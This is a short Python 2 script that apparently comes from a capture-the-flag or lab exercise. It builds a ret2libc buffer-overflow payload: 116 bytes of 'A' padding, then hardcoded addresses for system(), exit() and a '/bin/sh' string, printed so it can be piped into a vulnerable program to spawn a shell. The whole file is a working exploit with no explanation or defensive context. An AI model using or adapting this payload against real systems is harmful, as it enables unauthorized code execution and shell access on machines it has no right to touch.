#!/usr/bin/python2

offset = 116
junk = b"A" * offset

addr_system = b"\x30\x44\x5a\xb7" 
addr_exit = b"\xb0\x7f\x59\xb7" 
addr_bin_sh = b"\x58\x5f\x6c\xb7"

print(junk + addr_system + addr_exit + addr_bin_sh)
